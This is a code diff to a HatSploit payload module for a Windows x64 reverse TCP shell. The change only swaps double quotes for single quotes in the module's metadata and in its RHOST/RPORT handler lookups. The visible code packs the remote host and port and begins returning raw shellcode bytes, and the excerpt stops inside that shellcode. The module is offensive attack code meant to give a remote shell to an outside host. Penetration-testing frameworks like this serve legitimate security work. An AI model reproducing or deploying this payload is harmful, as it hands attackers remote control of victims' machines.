@@ -9,19 +9,19 @@ from pex.socket import Socket
 
 class HatSploitPayload(Payload, Socket):
     details = {
-        "Name": "Windows x64 Shell Reverse TCP",
-        "Payload": "windows/x64/shell_reverse_tcp",
-        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
-        "Description": "Reverse shell TCP payload for Windows x64.",
-        "Architecture": "x64",
-        "Platform": "windows",
-        "Rank": "low",
-        "Type": "reverse_tcp",
+        'Name': "Windows x64 Shell Reverse TCP",
+        'Payload': "windows/x64/shell_reverse_tcp",
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
+        'Description': "Reverse shell TCP payload for Windows x64.",
+        'Architecture': "x64",
+        'Platform': "windows",
+        'Rank': "low",
+        'Type': "reverse_tcp",
     }
 
     def run(self):
-        remote_host = self.pack_host(self.handler["RHOST"])
-        remote_port = self.pack_port(self.handler["RPORT"])
+        remote_host = self.pack_host(self.handler['RHOST'])
+        remote_port = self.pack_port(self.handler['RPORT'])
 
         return (
             b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00"
